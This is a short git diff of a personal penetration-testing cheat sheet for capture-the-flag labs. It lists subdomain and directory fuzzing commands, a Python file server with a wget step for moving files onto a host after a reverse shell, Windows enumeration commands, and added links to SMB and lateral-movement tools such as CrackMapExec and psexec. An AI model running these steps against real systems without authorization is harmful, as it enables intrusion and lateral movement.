@@ -13,7 +13,6 @@ ffuf -u <url> -H "Host: FUZZ.<url>" -w /opt/SecLists/Discovery/DNS/subdomains...
 ffuf -u <url> -H "Host: <url>.FUZZ" -w /usr/share/wordlists/wordlist...
 dirsearch -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -u 'http://bulwarkadm.htb:8080/' -t 256 -e php -f 
 
-
 Python http server
 python3 -m http.server (port 8000 default)
 wget <my-ip>:<port>/<path-to-file> (file upload on revshells)
@@ -30,6 +29,10 @@ file <filename>
 WINDOWS
 net user
 net user groups
+https://github.com/ShawnDEvans/smbmap -> smb enumeration tool
+https://github.com/byt3bl33d3r/CrackMapExec -> crackmap exec
+smbexec / psexec / wmiexec
+
 
 ROOT STUFF
 uname -a 
